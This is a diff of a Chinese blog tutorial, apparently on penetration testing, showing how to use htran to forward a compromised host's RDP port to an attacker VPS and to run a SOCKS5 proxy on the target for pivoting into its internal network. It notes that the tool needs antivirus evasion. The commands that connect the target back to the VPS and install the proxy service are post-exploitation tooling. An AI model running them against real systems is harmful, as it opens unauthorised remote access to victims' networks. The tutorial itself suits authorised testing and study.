@@ -163,20 +163,20 @@
 <p>1)首先,是最常规的端口转发功能:</p>
 <p>0x01 首先,到vps上监听好指定的端口,意思是把本地的443端口流量转到本地的1234端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -listen 443 1234</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_listen_win.png" alt=""></p>
-<p>0x02 然后,再回到目标机器上执行,意思就是把肉鸡的3389端口的流量转到vps的443端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -slave 192.168.3.251[实际测试中应该是自己vps的ip] 443 192.168.32.134 3389</span></div></pre></td></tr></table></figure></p>
+<p>0x02 然后,回到目标机器上执行,意思就是把肉鸡的3389端口的流量转到vps的443端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -slave 192.168.3.251[实际测试中应该是自己vps的ip] 443 192.168.32.134 3389</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_slave_win.png" alt=""></p>
-<p>0x03 最后,再在vps本地用指定的工具连接到最开始转出到的1234端口上,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span></div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/htran_listen_win_1.png" alt=""><br><img src="/img/htran_listen_win_2.png" alt=""><br></p>
+<p>0x03 最后,再回到vps本地用指定的工具连接到最开始转出到的1234端口上,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span></div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_listen_win_1.png" alt=""><br><img src="/img/htran_listen_win_2.png" alt=""></p>
 <p>2)其次,是相对比较实用的socks代理功能,让目标机器作为socks代理端,对目标内网进行渗透,不过这可能需要目标机器有个固定的公网ip,不然怎么练上去呢:</p>
 <p>0x01 先在目标机器上安装并启动socks5服务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -install</span></div><div class="line"><span class="comment"># HTran2.4.exe -start</span></div><div class="line"><span class="comment"># htran -remove  不用时,卸掉即可</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_socks_install_start.png" alt=""></p>
-<p>0x02 然后,再回到自己的vps上监听等会要连回来的端口,这里的-s才表示的是启用socks代理,而-p单单只是进行口转发<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -listen 1080 1234</span></div></pre></td></tr></table></figure></p>
+<p>0x02 然后,回到自己的vps上先监听好等会要连回来的端口,这里的-s才表示的是启用socks代理,而-p单单只是进行口转发<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -listen 1080 1234</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_socks_listen.png" alt=""></p>
-<p>0x03 上面都准备好以后,此时再回到目标机器上,开始和vps建立socks连接,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -connect 192.168.3.251 1080</span></div></pre></td></tr></table></figure></p>
+<p>0x03 上面都准备好以后,此时再回到目标机器上,开始和vps建立socks连接,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -connect 192.168.3.251[实际测试中应该是自己vps的ip] 1080</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_socks_connect.png" alt=""></p>
 <p>0x04 连接建立后,我们现在就可以回到我们自己本地的渗透系统中,安装好socskcap代理工具 [当然,你用别的socks客户端也一样],然后再工具设置中填写好vps的ip和socks代理的端口 [这里是1234这个端口],不过,要注意,如果你的vps开了防火墙,务必记得把这几个代理用到的端口都放开,要不然,数据是过不来的<br><img src="/img/htran_socks_sockcap.png" alt=""></p>
-<p>0x05 最后,在把自己常用的一些内网渗透工具加到该代理工具中,就可以进行正常内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""><br></p>
-<p>关于htran:<br>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点就是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
+<p>0x05 最后,在把自己常用的一些内网渗透工具加到该代理工具中,就可以对目标进行正常内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""></p>
+<p><br><br>关于htran:<br>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点还是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
 
     </div>
 
